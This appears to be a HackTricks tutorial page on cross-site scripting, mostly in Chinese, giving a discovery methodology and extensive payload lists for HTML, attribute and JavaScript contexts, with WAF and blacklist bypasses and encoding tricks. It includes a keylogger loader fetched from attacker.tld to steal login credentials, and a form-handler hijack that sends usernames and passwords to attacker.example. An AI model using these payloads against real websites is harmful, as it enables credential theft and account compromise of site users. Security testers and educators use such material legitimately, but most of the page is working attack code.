# XSS (Cross Site Scripting)

{{#include ../../banners/hacktricks-training.md}}

## 方法论

1. 检查是否有 **any value you control** (_parameters_, _path_, _headers_?, _cookies_?) 被 **反射** 到 HTML 中或被 **JS** 代码 **使用**。
2. **确定上下文**（输入被反射/使用的地点）。
3. 如果 **reflected**
1. 检查 **你可以使用哪些符号** 并据此准备 payload：
1. 在 **raw HTML** 中：
1. 你能创建新的 HTML 标签吗？
2. 你能使用支持 `javascript:` 协议的事件或属性吗？
3. 你能绕过保护措施吗？
4. HTML 内容是否被任何客户端 JS 引擎（_AngularJS_, _VueJS_, _Mavo_...）解析；如果是，你可以滥用 [**Client Side Template Injection**](../client-side-template-injection-csti.md)。
5. 如果你不能创建能执行 JS 的 HTML 标签，是否可以利用 [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html)？
2. 在 **HTML 标签** 内部：
1. 你能退出到 raw HTML 上下文吗？
2. 你能创建新的事件/属性来执行 JS 代码吗？
3. 你被限制的属性是否支持 JS 执行？
4. 你能绕过保护措施吗？
3. 在 **JavaScript code** 内部：
1. 你能跳出 `<script>` 标签吗？
2. 你能跳出字符串并执行不同的 JS 代码吗？
3. 你的输入是否在模板字面量 \`\` 中？
4. 你能绕过保护措施吗？
4. Javascript **function** 被 **执行**
1. 你可以指定要执行的函数名。例如：`?callback=alert(1)`
4. 如果 **used**：
1. 你可能会利用一个 **DOM XSS**，注意你的输入是如何被控制的以及你**可控的输入是否被任何 sink 使用**。

在处理复杂的 XSS 时，你可能会对下面内容感兴趣：


{{#ref}}
debugging-client-side-js.md
{{#endref}}

## 被反射的值

为了成功利用 XSS，首先你需要找到一个**由你控制并被反射**到网页中的值。

- **Intermediately reflected**: 如果你发现某个参数的值或路径被反射到网页中，你可以利用 **Reflected XSS**。
- **Stored and reflected**: 如果你发现由你控制的值被保存在服务器上，并在每次访问页面时被反射，你可以利用 **Stored XSS**。
- **Accessed via JS**: 如果你发现由你控制的值被 JS 访问，你可以利用 **DOM XSS**。

## 上下文

在尝试利用 XSS 时，首先需要知道你的输入被**反射到哪里**。根据不同的上下文，你可以用不同的方式执行任意 JS 代码。

### 原始 HTML

如果你的输入被**反射在原始 HTML** 页面上，你需要滥用某些 **HTML 标签** 来执行 JS 代码：`<img`, `<iframe`, `<svg`, `<script` ... 这些只是你可以使用的众多 HTML 标签中的一部分。另请记住 [Client Side Template Injection](../client-side-template-injection-csti.md)。

### 在 HTML 标签属性内部

如果你的输入被反射在标签属性的值中，你可以尝试：

1. 从属性和标签中**跳出**（这样你就进入 raw HTML）并创建新的 HTML 标签以滥用：`"><img [...]`
2. 如果你**能跳出属性但不能跳出标签**（`>` 被编码或删除），根据标签你可以**创建一个事件**来执行 JS 代码：`" autofocus onfocus=alert(1) x="`
3. 如果你**不能跳出属性**（`"` 被编码或删除），那么取决于你的值被反射在哪个**属性**中以及你是控制整个值还是仅控制一部分，你将能够利用它。举个**例子**，如果你控制一个像 `onclick=` 的事件，你将能在点击时让它执行任意代码。另一个有趣的**例子**是属性 `href`，你可以使用 `javascript:` 协议执行任意代码：**`href="javascript:alert(1)"`**
4. 如果你的输入被反射在 "**unexpoitable tags**" 内，你可以尝试 `accesskey` 技巧去滥用该漏洞（你需要一些社工手段来利用）：**`" accesskey="x" onclick="alert(1)" x="`**

#### Attribute-only login XSS behind WAFs

A corporate SSO login page reflected the OAuth `service` parameter inside the `href` attribute of `<a id="forgot_btn" ...>`. Even though `<` and `>` were HTML-encoded, double quotes were not, so the attacker could close the attribute and reuse the same element to inject handlers such as `" onfocus="payload" x="`.

1. **Inject the handler:** Simple payloads like `onclick="print(1)"` were blocked, but the WAF only inspected the first JavaScript statement in inline attributes. Prefixing a harmless expression wrapped in parentheses, then a semicolon, allowed the real payload to execute: `onfocus="(history.length);malicious_code_here"`.
2. **Auto-trigger it:** Browsers focus any element whose `id` matches the fragment, so appending `#forgot_btn` to the exploit URL forces the anchor to focus on page load and runs the handler without requiring a click.
3. **Keep the inline stub tiny:** The target already shipped jQuery. The handler only needed to bootstrap a request via `$.getScript(...)` while the full keylogger lived on the attacker's server.

**在没有引号的情况下构建字符串**

单引号以 URL 编码返回，转义的双引号会破坏属性，因此负载使用 `String.fromCharCode` 生成每个字符串。一个辅助函数可以轻松将任何 URL 转换为字符码，然后再粘贴到属性中：
```javascript
function toCharCodes(str){
return `const url = String.fromCharCode(${[...str].map(c => c.charCodeAt(0)).join(',')});`
}
console.log(toCharCodes('https://attacker.tld/keylogger.js'))
```
生成的属性看起来像：
```html
onfocus="(history.length);const url=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,116,108,100,47,107,101,121,108,111,103,103,101,114,46,106,115);$.getScript(url),function(){}"
```
**为什么这会窃取凭证**

外部脚本（从 attacker-controlled host 或 Burp Collaborator 加载）hooked `document.onkeypress`，缓冲按键，并每秒执行 `new Image().src = collaborator_url + keys`。因为 XSS 仅在未认证用户上触发，敏感操作就是登录表单本身——攻击者会 keylog（记录按键）用户名和密码，即使受害者从未按下“登录”。

如果你能控制类名，Angular 执行 XSS 的一个奇怪示例：
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
### 在 JavaScript 代码内部

在这种情况下，你的输入会被反射到 HTML 页面中的 **`<script> [...] </script>`** 标签之间，位于 `.js` 文件中，或位于使用 **`javascript:`** 协议的属性中：

- 如果被反射在 **`<script> [...] </script>`** 标签之间，即使你的输入处在任何形式的引号中，你也可以尝试注入 `</script>` 来跳出该上下文。这有效因为 **browser will first parse the HTML tags** 然后再解析内容，因此不会察觉你注入的 `</script>` 标签位于 HTML 代码内部。
- 如果被反射在 **inside a JS string** 中，且上一个技巧无效，你需要 **exit** 字符串、**execute** 你的代码并 **reconstruct** JS 代码（如果有任何错误，它将不会被执行：
- `'-alert(1)-'`
- `';-alert(1)//`
- `\';alert(1)//`
- 如果被反射在 template literals 内，你可以使用 `${ ... }` 语法 **embed JS expressions**：`` var greetings = `Hello, ${alert(1)}` ``
- **Unicode encode** 可以用来编写 **valid javascript code**：
```javascript
alert(1)
alert(1)
alert(1)
```
#### Javascript Hoisting

Javascript Hoisting 指的是可以在使用之后再**声明函数、变量或类**的场景，因此你可以利用在 XSS 中使用未声明变量或函数的情形进行滥用。\
**更多信息请查看以下页面：**


{{#ref}}
js-hoisting.md
{{#endref}}

### Javascript Function

一些网页的 endpoints 会**接受作为参数要执行的函数的名称**。在实际中常见的例子像：`?callback=callbackFunc`。

判断用户直接提供的内容是否被尝试执行的一个好方法是**修改该参数值**（例如改为 'Vulnerable'），并在控制台中查看类似的错误：

![](<../../images/image (711).png>)

如果存在漏洞，你可以仅通过发送该值来**触发 alert**：**`?callback=alert(1)`**。然而，这类 endpoints 很常见会**验证内容**，只允许字母、数字、点和下划线（**`[\w\._]`**）。

即便有上述限制，仍然可以执行某些操作。这是因为你可以使用这些合法字符来**访问 DOM 中的任何元素**：

![](<../../images/image (747).png>)

一些有用的函数包括：
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
你也可以尝试直接 **trigger Javascript functions**: `obj.sales.delOrders`.

然而，通常执行该函数的端点是没有太多有趣 DOM 的端点，**other pages in the same origin** 将有一个 **more interesting DOM** 来执行更多动作。

因此，为了在不同的 DOM 中**滥用该漏洞**，开发了 **Same Origin Method Execution (SOME)** 利用方法：


{{#ref}}
some-same-origin-method-execution.md
{{#endref}}

### DOM

存在 **JS code**，它**不安全地**使用一些**被攻击者控制的数据**，例如 `location.href`。攻击者可以滥用这一点来执行任意 JS 代码。


{{#ref}}
dom-xss.md
{{#endref}}

### **Universal XSS**

这类 XSS 可以在 **anywhere** 被发现。它们不仅依赖于对 web 应用的客户端利用，还依赖于 **any** **context**。这类 **arbitrary JavaScript execution** 甚至可以被滥用以获得 **RCE**、**读取** **任意** **文件**（在客户端和服务器上），以及更多。\
一些 **examples**：


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-web/electron-desktop-apps/
{{#endref}}

## WAF bypass encoding image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](<../../images/EauBb2EX0AERaNK (1).jpg>)

## Injecting inside raw HTML

当你的输入被反射到 **inside the HTML page** 或者你可以在此上下文中转义并注入 HTML 代码时，**第一**件事是检查你是否可以滥用 `<` 来创建新标签：只需尝试 **reflect** 那个 **char**，并检查它是否被 **HTML encoded** 或 **deleted**，或者是否 **reflected without changes**。**只有在最后一种情况下你才能利用该情况**。\
对于这些情况也要 **keep in mind** [**Client Side Template Injection**](../client-side-template-injection-csti.md)**.**\
_**Note: A HTML comment can be closed using\*\***\***\*`-->`\*\***\***\*or \*\***`--!>`\*\*_

在这种情况下，如果没有使用黑/白名单过滤，你可以使用类似以下的 payloads：
```html
<script>
alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>
```
但是，如果使用了 tags/attributes 的 black/whitelisting，你需要**对可以创建的标签进行 brute-force**。\
一旦你**定位到哪些标签被允许**，就需要在找到的有效标签内对**attributes/events 进行 brute-force**，以查看如何针对具体上下文发起攻击。

### 标签/事件 brute-force

访问 [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) 并点击 _**Copy tags to clipboard**_。然后，使用 Burp intruder 发送所有这些标签，并检查是否有标签未被 WAF 识别为恶意。一旦你发现哪些标签可用，就可以使用这些有效标签**brute force 所有事件**（在同一网页点击 _**Copy events to clipboard**_ 并按之前相同的流程操作）。

### 自定义标签

如果没找到任何有效的 HTML tag，可以尝试 **create a custom tag** 并用 `onfocus` 属性执行 JS 代码。在 XSS request 中，需要在 URL 末尾加上 `#`，以使页面**聚焦到该对象**并**执行**该代码：
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Blacklist Bypasses

如果正在使用某种 blacklist，你可以尝试用一些小技巧来 bypass 它：
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Length bypass (small XSSs)

> [!NOTE] > **更多用于不同环境的 tiny XSS payload** [**can be found here**](https://github.com/terjanq/Tiny-XSS-Payloads) 和 [**here**](https://tinyxss.terjanq.me).
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``> <script src=//aa.es> <script src=//℡㏛.pw>
```
最后一个使用了 2 个 unicode 字符，会扩展为 5 个：telsr\
More of these characters can be found [here](https://www.unicode.org/charts/normalization/).\
To check in which characters are decomposed check [here](https://www.compart.com/en/unicode/U+2121).

### Click XSS - Clickjacking

如果为了利用该漏洞你需要 **用户点击带有预填数据的链接或表单**，你可以尝试 [**abuse Clickjacking**](../clickjacking.md#xss-clickjacking)（如果页面易受攻击）。

### Impossible - Dangling Markup

如果你认为 **不可能创建带有可执行 JS 代码属性的 HTML 标签**，你应该查看 [**Danglig Markup** ](../dangling-markup-html-scriptless-injection/index.html)，因为你可以 **exploit** 该漏洞 **无需** 执行 **JS** 代码。

## 在 HTML 标签内注入

### Inside the tag/escaping from attribute value

如果你位于 **HTML 标签内部**，首先可以尝试 **从标签中跳出** 并使用 [previous section](#injecting-inside-raw-html) 中提到的一些技术来执行 JS 代码。\
如果你 **无法从标签中跳出**，你可以在标签内部创建新的属性来尝试执行 JS 代码，例如使用类似的 payload（_注意：在此示例中使用双引号来从属性中跳出，如果你的输入直接反映在标签内部则不需要它们_）:
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**样式事件**
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### 在属性内

即使你**无法从属性中转义** (`"` 正在被编码或删除)，取决于**哪个属性**你的值被反射以及你是控制整个值还是仅控制一部分，你将能够滥用它。**例如**，如果你控制像 `onclick=` 这样的事件，你可以使其在被点击时执行任意代码。\
另一个有趣的**例子**是属性 `href`，你可以使用 `javascript:` 协议执行任意代码：**`href="javascript:alert(1)"`**

**在事件内部使用 HTML 编码/URL 编码 绕过**

这些 HTML 标签属性值内的 **HTML 编码的字符** 会在**运行时解码**。因此像下面这样的将是有效的（payload 用粗体表示）： `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

注意**任何形式的 HTML 编码都是有效的**:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**注意 URL encode 也可行:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**在 event 内通过 Unicode encode 绕过**
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### 属性中的特殊协议

在那里你可以使用协议 **`javascript:`** 或 **`data:`** 在某些地方 **执行任意 JS 代码**。有些需要用户交互，有些不需要。
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**可以注入这些协议的地方**

**一般来说** `javascript:` 协议可以 **用于任何接受 `href` 属性的标签**，并且在 **大多数** 接受 **`src` 属性** 的标签中也可以使用（但不包括 `<img>`）
```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**其他混淆技巧**

_**在这种情况下，上一节的 HTML encoding 和 Unicode encoding 技巧在属性内同样有效。**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
此外，对于这些情况还有一个**不错的技巧**：**即使你在 `javascript:...` 内的输入被 URL 编码，它在执行前也会被 URL 解码。**所以，如果你需要使用**单引号**从**字符串**中**转义**，并且你看到**它被 URL 编码**，记住**这并不重要，**它在**执行**时会被**解释为**一个**单引号**。
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
注意，如果你尝试 **同时使用** `URLencode + HTMLencode` 在任何顺序来对 **payload** 进行编码，它 **不会** **生效**，但你可以 **在 payload 内部混合使用它们**。

**使用 Hex 和 Octal encode 与 `javascript:`**

你可以在 `iframe` 的 `src` 属性（至少）内使用 **Hex** 和 **Octal encode** 来声明 **HTML tags to execute JS**：
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing
```javascript
<a target="_blank" rel="opener"
```
If you can inject any URL in an arbitrary **`<a href=`** tag that contains the **`target="_blank" and rel="opener"`** attributes, check the **following page to exploit this behavior**:

{{#ref}}
../reverse-tab-nabbing.md
{{#endref}}

### on 事件处理程序绕过

首先查看此页面 ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) 以获取有用的 **"on" 事件处理程序**。\
如果存在某种黑名单阻止你创建这些事件处理程序，可以尝试以下绕过方法：
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS 在 "不可利用的标签" (hidden input, link, canonical, meta)

从 [**here**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **现在可以通过以下方式滥用 hidden inputs：**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)" />
```
以及在 **meta tags**:
```html
<!-- Injection inside meta attribute-->
<meta
name="apple-mobile-web-app-title"
content=""
Twitter
popover
id="newsletter"
onbeforetoggle="alert(2)" />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
来自 [**here**](https://portswigger.net/research/xss-in-hidden-input-fields)：您可以执行一个 **XSS payload 在 hidden attribute 中**，前提是您能 **说服** **victim** 按下 **按键组合**。在 Firefox Windows/Linux 上，按键组合是 **ALT+SHIFT+X**；在 OS X 上是 **CTRL+ALT+X**。您可以在 access key attribute 中使用不同的键来指定不同的按键组合。向量如下：
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**XSS 有效载荷类似于：`" accesskey="x" onclick="alert(1)" x="`**

### 黑名单绕过

本节已经展示了若干使用不同编码的技巧。返回学习可以在哪些地方使用：

- **HTML encoding (HTML tags)**
- **Unicode encoding (can be valid JS code):** `\u0061lert(1)`
- **URL encoding**
- **Hex and Octal encoding**
- **data encoding**

**Bypasses for HTML tags and attributes**

阅读[ Blacklist Bypasses of the previous section](#blacklist-bypasses).

**Bypasses for JavaScript code**

阅读 J[avaScript bypass blacklist of the following section](#javascript-bypass-blacklists-techniques).

### CSS-Gadgets

如果你在页面的一个非常小的区域发现了一个 **XSS**，并且它需要某种交互（例如 footer 中的一个带有 onmouseover 的小链接），你可以尝试 **修改该元素所占的空间**，以最大化触发该链接的概率。

例如，你可以在元素中添加如下样式：`position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

但是，如果 WAF 在过滤 style 属性，你可以使用 CSS Styling Gadgets，例如如果你发现：

> .test {display:block; color: blue; width: 100%\}

以及

> \#someid {top: 0; font-family: Tahoma;}

现在你可以修改我们的链接，使其变为：

> \<a href="" id=someid class=test onclick=alert() a="">

这个技巧来自 [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## Injecting inside JavaScript code

在这种情况下，你的输入将被反射到 `.js` 文件的 JS 代码中，或位于 `<script>...</script>` 标签之间，或位于可以执行 JS 的 HTML 事件中，或位于接受 `javascript:` 协议的属性中。

### 逃逸 \<script> 标签

如果你的代码被插入到 `<script> [...] var input = 'reflected data' [...] </script>` 之内，你可以很容易地**逃逸（关闭）`<script>`** 标签：
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
注意在这个示例中我们 **甚至没有关闭单引号**。这是因为 **HTML 解析首先由浏览器执行**，这涉及识别页面元素，包括 script 块。随后才会对 JavaScript 进行解析，以理解并执行嵌入的脚本。

### 在 JS 代码内

如果 `<>` 被过滤，你仍然可以在你的输入被**放置**的地方**转义字符串**并**执行任意 JS**。重要的是要**修复 JS 语法**，因为如果有任何错误，JS 代码将不会被执行：
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
#### JS-in-JS string break → inject → repair pattern

当用户输入落在带引号的 JavaScript 字符串内（e.g., server-side echo into an inline script）时，你可以终止该字符串、注入代码，并修复语法以保持解析有效。通用骨架：
```
"            // end original string
;            // safely terminate the statement
<INJECTION>  // attacker-controlled JS
; a = "      // repair and resume expected string/statement
```
示例 URL 模式（当易受攻击的参数被反射到 JS 字符串中时）：
```
?param=test";<INJECTION>;a="
```
这会执行攻击者 JS，而无需接触 HTML 上下文（纯 JS-in-JS）。当过滤器屏蔽关键字时，可与下面的 blacklist bypasses 结合使用。

### 模板字面量 ``

为了构造**字符串**，除了单引号和双引号外，JS 也接受**backticks** **` `` `**。这被称为模板字面量，因为它们允许使用 `${ ... }` 语法来**嵌入 JS 表达式**。\
因此，如果你发现你的输入被**反射**到使用 backticks 的 JS 字符串内部，你可以滥用 `${ ... }` 语法来执行**任意 JS 代码**：

这可以通过以下方式**滥用**：
```javascript
;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
```

```javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop() {
return loop
}
loop``
```
### 编码后的代码执行
```html
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">
```
#### 可交付 payloads：eval(atob()) 与作用域细微差异

为了缩短 URL 并绕过简单的关键字过滤，你可以将真实逻辑进行 base64 编码并用 `eval(atob('...'))` 来执行。如果简单的关键字过滤会阻止像 `alert`、`eval` 或 `atob` 这样的标识符，可以使用 Unicode 转义的标识符，这些标识符在浏览器中编译后与原本相同，但可以逃避字符串匹配过滤器：
```
\u0061\u006C\u0065\u0072\u0074(1)                      // alert(1)
\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
```
重要的作用域细节：`eval()` 中声明的 `const`/`let` 是块级作用域的，并不会创建全局变量；它们对后续脚本不可访问。需要定义全局且不可重新绑定的 hooks 时（例如，为了 hijack a form handler），请使用动态注入的 `<script>` 元素：
```javascript
var s = document.createElement('script');
s.textContent = "const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
document.head.appendChild(s);
```
参考: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

### Unicode 编码的 JS 执行
```javascript
alert(1)
alert(1)
alert(1)
```
### JavaScript 绕过黑名单技术

**字符串**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**特殊转义**
```javascript
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
// Any other char escaped is just itself
```
**JS 代码中的空格替换**
```javascript
<TAB>
/**/
```
**JavaScript comments (来自** [**JavaScript Comments**](#javascript-comments) **技巧)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScript new lines (来自** [**JavaScript new line**](#javascript-new-lines) **trick)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10)
alert("//\nalert(1)") //0x0a
String.fromCharCode(13)
alert("//\ralert(1)") //0x0d
String.fromCharCode(8232)
alert("//\u2028alert(1)") //0xe2 0x80 0xa8
String.fromCharCode(8233)
alert("//\u2029alert(1)") //0xe2 0x80 0xa9
```
**JavaScript 空白字符**
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**Javascript 在注释中**
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript 无需括号**
```javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x`

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
